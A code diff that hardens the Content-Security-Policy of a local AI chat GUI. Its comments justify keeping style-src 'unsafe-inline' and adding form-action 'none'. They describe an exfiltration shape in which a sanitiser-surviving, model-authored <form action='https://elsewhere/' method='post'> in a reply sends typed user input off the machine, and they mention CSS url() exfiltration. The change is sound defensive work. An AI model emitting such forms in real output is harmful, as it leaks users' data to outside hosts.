@@ -4237,9 +4237,40 @@ def create_app(engine: Optional[Engine], *, api_landing: bool = False) -> FastAP
     # shell's own inline scripts run and an injected one cannot. Adding
     # 'unsafe-inline' alongside would be pointless as well as wrong: a policy
     # containing a nonce makes browsers IGNORE 'unsafe-inline' entirely.
-    # style-src DELIBERATELY keeps 'unsafe-inline' - the GUI sets inline style
-    # attributes throughout, style injection is not script execution, and closing
-    # it would mean rewriting every one. The remaining directives are unchanged
+    # style-src DELIBERATELY keeps 'unsafe-inline', and the NONCE CANNOT REPLACE
+    # IT - that is a spec-level fact, not a matter of effort, so do not "finish
+    # the job" by moving style-src onto the nonce. CSP3's "is element nonceable"
+    # algorithm covers <script>, <style> and <link> ELEMENTS only; an inline
+    # style ATTRIBUTE is reachable only by 'unsafe-inline' or by 'unsafe-hashes'
+    # plus a hash per distinct attribute value. index.html carries 52 such
+    # attributes (41 of them display:none), which is what would have to go.
+    # MEASURED 2026-08-18 against a live GUI, serving style-src 'self' and
+    # reloading: 32 elements that must start hidden became VISIBLE (file inputs,
+    # the coder composer, pull progress, the pairing and install modals all
+    # painted at once), and a probe attribute stopped applying - so this is
+    # load-bearing, not habit. Two things that are NOT blockers, recorded so the
+    # next reader does not re-derive them: KaTeX keeps working under the strict
+    # policy (it styles via CSSOM, which CSP does not govern - verified, a
+    # rendered fraction still computed to its 20.875px height), and the app's own
+    # el.style.x = y writes are equally unaffected. What it costs is bounded and
+    # named: DOMPurify passes a model-authored style ATTRIBUTE through, so a
+    # reply can restyle its own subtree. That is presentation, not execution, and
+    # img-src/connect-src still deny the CSS url() exfiltration path.
+    #
+    # form-action 'none' because NOTHING in this GUI submits a form - there is
+    # not one <form> element in static/, and every mutation goes through fetch().
+    # It is not covered by default-src: form-action is a NAVIGATION directive
+    # with no fallback, so omitting it allows submission ANYWHERE. That mattered:
+    # DOMPurify's default ALLOWED_TAGS includes <form>, so a model reply
+    # rendering <form action="https://elsewhere/" method="post"><input ...> came
+    # through sanitisation intact, and MEASURED 2026-08-18 in a real browser its
+    # action resolved to that remote origin with NO CSP violation raised. No
+    # script is involved, so neither DOMPurify nor the script-src nonce is in
+    # that path - for an offline-first product this was a way for a rendered
+    # reply to post what the user typed into it off the machine. 'none' rather
+    # than 'self' since there is no legitimate same-origin submission either, and
+    # that also closes the same-origin CSRF shape against localm's own /api.
+    # The remaining directives are unchanged
     # from the report-only policy and were each confirmed against a live GUI.
     #
     # NO CDN ORIGIN IS LISTED, AND NOTHING NEEDS ONE. The tts plugin's Kokoro
@@ -4308,6 +4339,10 @@ def create_app(engine: Optional[Engine], *, api_landing: bool = False) -> FastAP
         "frame-src 'self'; "
         "object-src 'none'; "
         "base-uri 'none'; "
+        # See the form-action note above: a NAVIGATION directive, no default-src
+        # fallback, so leaving it out allowed a sanitiser-surviving model-authored
+        # <form> to post off-box. Nothing in the GUI submits a form.
+        "form-action 'none'; "
         "frame-ancestors 'none'"
     )
 
